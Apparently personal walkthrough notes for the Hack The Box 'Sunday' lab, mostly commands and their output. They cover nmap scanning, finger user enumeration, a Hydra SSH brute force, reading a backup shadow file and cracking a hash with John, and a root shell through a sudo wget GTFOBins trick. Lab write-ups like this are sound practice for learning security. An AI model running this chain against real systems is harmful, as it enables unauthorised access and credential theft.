- ping machine
	- `ping ###.###.###.###`
	```bash
┌──(kali㉿kali)-[~]                                                                   
└─$ ping 10.10.10.76                                                                 
PING 10.10.10.76 (10.10.10.76) 56(84) bytes of data.                                 
64 bytes from 10.10.10.76: icmp_seq=1 ttl=254 time=52.0 ms                           
64 bytes from 10.10.10.76: icmp_seq=3 ttl=254 time=53.5 ms                           
64 bytes from 10.10.10.76: icmp_seq=4 ttl=254 time=55.1 ms                           
^C                                                                                   
--- 10.10.10.76 ping statistics ---                                                  
4 packets transmitted, 4 received, 0% packet loss, time 3004ms                       
rtt min/avg/max/mdev = 52.019/54.247/56.320/1.625 ms
```
- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	```bash
┌──(kali㉿kali)-[~/htb/sunday]
└─$ nmap -p- -T4 --open -Pn -vvv 10.10.10.76 -oN sundayNmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-04 17:24 EST
Initiating Parallel DNS resolution of 1 host. at 17:24
Completed Parallel DNS resolution of 1 host. at 17:24, 2.51s elapsed
DNS resolution of 1 IPs took 2.51s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating SYN Stealth Scan at 17:24
Scanning 10.10.10.76 [65535 ports]
Discovered open port 111/tcp on 10.10.10.76
Discovered open port 79/tcp on 10.10.10.76
Discovered open port 515/tcp on 10.10.10.76
Discovered open port 22022/tcp on 10.10.10.76
SYN Stealth Scan Timing: About 48.58% done; ETC: 17:25 (0:00:33 remaining)
Discovered open port 6787/tcp on 10.10.10.76
Completed SYN Stealth Scan at 17:25, 52.49s elapsed (65535 total ports)
Nmap scan report for 10.10.10.76
Host is up, received user-set (0.054s latency).
Scanned at 2025-01-04 17:24:21 EST for 52s
Not shown: 63450 filtered tcp ports (no-response), 2080 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
79/tcp    open  finger    syn-ack ttl 59
111/tcp   open  rpcbind   syn-ack ttl 63
515/tcp   open  printer   syn-ack ttl 59
6787/tcp  open  smc-admin syn-ack ttl 59
22022/tcp open  unknown   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 55.11 seconds
           Raw packets sent: 129183 (5.684MB) | Rcvd: 2085 (83.420KB)
```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
	```bash
┌──(kali㉿kali)-[~/htb/sunday]                                                       
└─$ nmap -p 79,111,515,6787,22022 -sC -sV 10.10.10.76 -oN sundayNmapServicesVersions.txt                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-04 17:35 EST                                                                  
Nmap scan report for 10.10.10.76                                                    
Host is up (0.055s latency). 

PORT      STATE SERVICE VERSION                                                     
79/tcp    open  finger?                                                             
|_finger: No one logged on\x0D                                                      
| fingerprint-strings:                                                              
|   GenericLines:                                                                   
|     No one logged on                                                              
|   GetRequest:                                                                     
|     Login Name TTY Idle When Where                                                
|     HTTP/1.0 ???                                                                  
|   HTTPOptions:                                                                    
|     Login Name TTY Idle When Where                                                
|     HTTP/1.0 ???                                                                  |     OPTIONS ???                                                                   
|   Help:                                                                           
|     Login Name TTY Idle When Where                                                
|     HELP ???                                                                      
|   RTSPRequest:                                                                    
|     Login Name TTY Idle When Where                                                
|     OPTIONS ???                                                                   
|     RTSP/1.0 ???                                                                  
|   SSLSessionReq, TerminalServerCookie:                                            
|_    Login Name TTY Idle When Where                                                
111/tcp   open  rpcbind 2-4 (RPC #100000)                                           
515/tcp   open  printer                                                             
6787/tcp  open  http    Apache httpd                                                
|_http-server-header: Apache                                                        
|_http-title: 400 Bad Request                                                       
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)                                  
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://n
map.org/cgi-bin/submit.cgi?new-service :
```

- enumerating 79
	```bash
┌──(kali㉿kali)-[~/htb/sunday]                                           
└─$ curl 10.10.10.76:79                                                  
curl: (1) Received HTTP/0.9 when not allowed                                        
┌──(kali㉿kali)-[~/htb/sunday]                                           
└─$ curl --http0.9 10.10.10.76:79                   -t                   Login       Name               TTY         Idle    When    Where         
/                     ???                                                
HTTP/1.1              ???

┌──(kali㉿kali)-[~/htb/sunday]
└─$ nc 10.10.10.76 79 
root
Login       Name               TTY         Idle    When    Where
root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46   

┌──(kali㉿kali)-[~/htb/sunday]
└─$ nc 10.10.10.76 79 
admin
Login       Name               TTY         Idle    When    Where
adm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >


```

- running finger-user-enum.pl from pentest monkey
	- https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl
	- reveals sammy@10.10.10.76 and sunny@10.10.10.76
```bash
┌──(kali㉿kali)-[/usr/local/bin]
└─$ sudo ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sat Jan 11 12:16:19 2025 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46         ..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..

```

- brute forcing p/w on sunny with Hydra
	- reveals password for sunny to be sunday
```bash
┌──(kali㉿kali)-[/usr/local/bin]
└─$ hydra -l sunny -P /usr/share/wordlists/seclists/Passwords/days.txt ssh://10.10.10.76:22022 -t 4 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-11 13:10:43
[DATA] max 4 tasks per 1 server, overall 4 tasks, 6240 login tries (l:1/p:6240), ~1560 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[STATUS] 1182.00 tries/min, 1182 tries in 00:01h, 5058 to do in 00:05h, 4 active
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-11 13:13:36

```

- catting /etc/passwd for users on box
```bash
sunny@sunday:~$ cat /etc/passwd 
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:/bin/sh
bin:x:2:2::/:/bin/sh
sys:x:3:3::/:/bin/sh
adm:x:4:4:Admin:/var/adm:/bin/sh
dladm:x:15:65:Datalink Admin:/:
netadm:x:16:65:Network Admin:/:
netcfg:x:17:65:Network Configuration Admin:/:
dhcpserv:x:18:65:DHCP Configuration Admin:/:
ftp:x:21:21:FTPD Reserved UID:/:
sshd:x:22:22:sshd privsep:/var/empty:/bin/false
smmsp:x:25:25:SendMail Message Submission Program:/:
aiuser:x:61:61:AI User:/:
ikeuser:x:67:12:IKE Admin:/:
lp:x:71:8:Line Printer Admin:/:/bin/sh
openldap:x:75:75:OpenLDAP User:/:/usr/bin/pfbash
webservd:x:80:80:WebServer Reserved UID:/:/bin/sh
unknown:x:96:96:Unknown Remote UID:/:/bin/sh
pkg5srv:x:97:97:pkg(7) server UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:/bin/sh
noaccess:x:60002:65534:No Access User:/:/bin/sh
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh
sammy:x:100:10::/home/sammy:/usr/bin/bash
sunny:x:101:10::/home/sunny:/usr/bin/bash
_ntp:x:73:73:NTP Daemon:/var/ntp:

```
- navigating to /backup reveals shadow.backup
```bash
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
- using john ripper to crack the hash
	- copy whole line from shadow.backup of sammy to kali and drop in file sammy.txt
	- cracks to cooldude!
```bash
┌──(kali㉿kali)-[~/htb/sunday]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt sammy.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (sammy)     
1g 0:00:00:31 DONE (2025-01-11 14:04) 0.03225g/s 6589p/s 6589c/s 6589C/s domonique1..canpanita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
- switching user to sammy with the password cooldude1
	- checking for commands we can run as sudo with 'sudo -l'
	- reveals we can run wget as root with no password
```bash
sammy@sunday:~$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
- navigating to GTFO bins reveals binary wget can be run to get sudo
	- `https://gtfobins.github.io/gtfobins/wget/#sudo`
	- Sudo - If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
	```bash
sammy@sunday:~$ TF=$(mktemp)
sammy@sunday:~$ chmod +x $TF
sammy@sunday:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sammy@sunday:~$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sunny# whoami
root
```
- navigating to roots base directory reveals root.txt
```bash
root@sunday:/home/sunny# cd                                                                
root@sunday:~# ls                                                                          
overwrite       root.txt        troll           troll.original
root@sunday:~# cat root.txt 
```



- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
	- 

- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Foothold
	- sudo -l




